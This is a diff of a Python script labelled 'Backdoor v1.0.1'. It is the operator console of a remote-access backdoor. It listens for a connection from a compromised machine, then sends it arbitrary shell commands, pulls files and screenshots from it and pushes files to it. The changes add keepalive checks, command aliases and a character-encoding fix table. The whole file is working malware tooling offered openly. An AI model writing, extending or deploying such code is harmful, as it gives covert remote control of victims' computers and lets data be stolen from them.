@@ -1,6 +1,9 @@
 # netstat -an | findstr 57575 | findstr TCP | findstr LISTENING
 # ipconfig /all | findstr /I ipv4
-# Python 3.8
+# Testet in: Python 3.8.8
+# By: LawlietJH
+# Backdoor v1.0.1
+
 import atexit
 import socket
 import base64
@@ -21,6 +24,7 @@ class Server:
 		self.LPORT  = LPORT
 		self.LOCAL  = (self.LHOST, self.LPORT)
 		self.sc_count = 0
+		# ~ self.fs_encoding = sys.getfilesystemencoding()
 		
 		if not download_path.endswith('/'): download_path+='/'
 		if not upload_path.endswith('/'):   upload_path+='/'
@@ -31,10 +35,86 @@ class Server:
 	
 	def command_list(self):
 		
-		self.EXIT = ['exit', 'close', 'break']
-		self.CLS  = ['cls', 'clear']
-		self.DOWNLOAD = 'download'
-		self.UPLOAD   = 'upload'
+		self.EXIT = ('exit', 'close', 'break', 'stop', 'return')
+		self.CLS  = ('cls', 'clear')
+		self.DOWNLOAD = ('download', 'dl')
+		self.UPLOAD   = ('upload', 'ul')
+	
+	def latin1_encoding(self, res):
+		
+		res = res.decode('latin1')
+		
+		res = res.replace('·','À')
+		res = res.replace('ú','·')
+		res = res.replace('¨','¿')
+		res = res.replace('ù','¨')
+		res = res.replace('ï','´')
+		res = res.replace('­','¡')
+		res = res.replace('§','º')
+		res = res.replace('ª','¬')
+		res = res.replace('¦','ª')
+		res = res.replace('ì','ý')
+		res = res.replace('','ÿ')
+		
+		res = res.replace('','ù')
+		res = res.replace('£','ú')
+		res = res.replace('','ü')
+		res = res.replace('ë','Ù')
+		res = res.replace('é','Ú')
+		res = res.replace('','Ü')
+		
+		res = res.replace('','è')
+		res = res.replace('','é')
+		res = res.replace('','ë')
+		res = res.replace('Ô','È')
+		res = res.replace('','É')
+		res = res.replace('Ó','Ë')
+		
+		res = res.replace('','ì')
+		res = res.replace('¡','í')
+		res = res.replace('','ï')
+		res = res.replace('Þ','Ì')
+		res = res.replace('Ö','Í')
+		res = res.replace('Ø','Ï')
+		
+		res = res.replace('¶','Â')
+		res = res.replace('Ò','Ê')
+		res = res.replace('×','Î')
+		res = res.replace('â','Ô')
+		res = res.replace('ê','Û')
+		
+		res = res.replace('','ò')
+		res = res.replace('¢','ó')
+		res = res.replace('','ö')
+		res = res.replace('ã','Ò')
+		res = res.replace('à','Ó')
+		res = res.replace('','Ö')
+		
+		res = res.replace('Ç','Ã')
+		res = res.replace('å','Õ')
+		res = res.replace('Æ','ã')
+		res = res.replace('ä','õ')
+		
+		res = res.replace('','à')
+		res = res.replace(' ','á')
+		res = res.replace('','ä')
+		res = res.replace('µ','Á')
+		res = res.replace('','Ä')
+		
+		res = res.replace('','â')
+		res = res.replace('','ê')
+		res = res.replace('','î')
+		res = res.replace('','ô')
+		res = res.replace('','û')
+		
+		res = res.replace('¥','Ñ')
+		res = res.replace('¤','ñ')
+		
+		res = res.replace('','ç')
+		res = res.replace('','Ç')
+		
+		return res
+					
 	
 	def get_chunks(self, data, bfc=2**16):	# 2^16 = 65536 bytes = 64 kb, bfc = bytes for chunk
 		
@@ -92,49 +172,67 @@ class Server:
 		while True:
 			
 			try:
+				self.client.send('alive'.encode())
+				self.client.recv(2)
+			except ConnectionAbortedError:
+				sys.exit()
+			
+			try:
 				command = input('{}~#: '.format(self.current_dir))
 			except KeyboardInterrupt:
+				print()
 				command = 'exit'
-				
+			
+			command = command.strip()
+			
 			#===========================================================
 			# Commands:
 			
 			if command.lower() in self.EXIT:
 				self.client.send(self.EXIT[0].encode())
-				print('\n Cerrando Conexion...')
+				print('\n [+] Cerrando Conexion...')
 				break
 			elif command.lower().startswith('cd'):
-				if len(command) > 2:
+				if len(command) >= 2:
 					self.client.send(command.encode())
-					resp = self.client.recv(1024).decode('utf-8', 'ignore')
-					if resp.startswith('No existe la ruta:'):
+					resp = self.client.recv(1024)
+					if command.lower() == 'cd':
+						resp = self.latin1_encoding(resp)
 						print(resp)
 					else:
-						self.current_dir = resp
+						resp = resp.decode('utf-8', 'ignore')
+						if resp.startswith('No existe la ruta:'):
+							print(resp)
+						else:
+							self.current_dir = resp
 			elif command.lower().startswith(self.DOWNLOAD):
-				self.chk_download_path()
-				self.client.send(command.encode())
-				res = self.client.recv(1024).decode('utf-8', 'ignore')
-				if res == 'file does not exist':
-					print('\n    Ese archivo no existe!\n')
+				if not (command.lower() == 'dl' and len(command.lower()) > 2) \
+				or not (command.lower() == 'download' and len(command.lower()) > 8):
+					print('\n Use: download FILE\n')
 				else:
-					self.client.send('ok'.encode())
-					file_name = command[len(self.DOWNLOAD):].strip()
-					chunks = self.client.recv(1024).decode('utf-8', 'ignore')
-					chunks = int(chunks.replace('Chunks: ',''))
-					self.client.send('ok'.encode())
-					data = ''.encode()
-					print('')
-					for i in range(chunks):
-						chunk = self.client.recv(2**16)
-						data += chunk
-						bar = self.progress_bar(i+1, chunks)
-						print('\r [+] Downloading: '+bar, end='')
+					self.chk_download_path()
+					self.client.send(command.encode())
+					res = self.client.recv(1024).decode('utf-8', 'ignore')
+					if res == 'file does not exist':
+						print('\n    Ese archivo no existe!\n')
+					else:
 						self.client.send('ok'.encode())
-					with open(self.download_path+file_name, 'wb') as file_:
-						file_.write(base64.b64decode(data))
-						file_.close()
-					print('\n\n  Descarga Completada! Archivo: '+file_name+'\n')
+						file_name = command[len(self.DOWNLOAD):].strip()
+						chunks = self.client.recv(1024).decode('utf-8', 'ignore')
+						chunks = int(chunks.replace('Chunks: ',''))
+						self.client.send('ok'.encode())
+						data = ''.encode()
+						print('')
+						for i in range(chunks):
+							chunk = self.client.recv(2**16)
+							data += chunk
+							bar = self.progress_bar(i+1, chunks)
+							print('\r [+] Downloading: '+bar, end='')
+							self.client.send('ok'.encode())
+						with open(self.download_path+file_name, 'wb') as file_:
+							file_.write(base64.b64decode(data))
+							file_.close()
+						print('\n\n  Descarga Completada! Archivo: '+file_name+'\n')
 			elif command.lower().startswith(self.UPLOAD):
 				self.chk_upload_path()
 				file_name = command[6:].strip()
@@ -221,14 +319,19 @@ class Server:
 					file_.close()
 				print('\n\n  Descarga Completada! Screenshot: '+file_name+'\n')
 				self.sc_count += 1
-			elif command.lower() in self.CLS: os.system('cls')
+			elif command.lower() in self.CLS:
+				os.system('cls')
+				print()
+				self.client.send('cls'.encode())
+				self.client.recv(2)
 			elif not command: pass
 			else:
 				self.client.send(command.encode())
-				res = self.client.recv(2**16).decode('utf-8', 'ignore')
+				res = self.client.recv(2**16)
+				res = self.latin1_encoding(res)
 				if res == 'None':
 					if command.startswith('mkdir'):
-						print('\n    Carpeta \'{}\' creada con exito.\n'.format(command[5:].strip()))
+						print('\n    Carpeta \'{}\' creada con éxito.\n'.format(command[5:].strip()))
 				else:
 					print(res)
 			
@@ -246,18 +349,21 @@ class Server:
 		
 		self.server.listen(1)
 		
-		print('\n [~] Corriendo servidor y esperando conexiones...')
+		print('\n [~] Corriendo servidor y esperando conexión...')
 		
 		self.client, self.IP = self.server.accept()
 		
-		print('\n [+] Conexion recibida de:', self.IP[0], '\n')
+		print('\n [+] Conexión recibida de:', self.IP[0], '\n')
 
 
 
 @atexit.register
 def close():
 	if server.client:
-		server.client.send(server.EXIT[0].encode())
+		try:
+			server.client.send(server.EXIT[0].encode())
+		except ConnectionAbortedError:
+			print(' [-] Se ha anulado la conexión establecida por el software en su equipo host.')
 
 
 
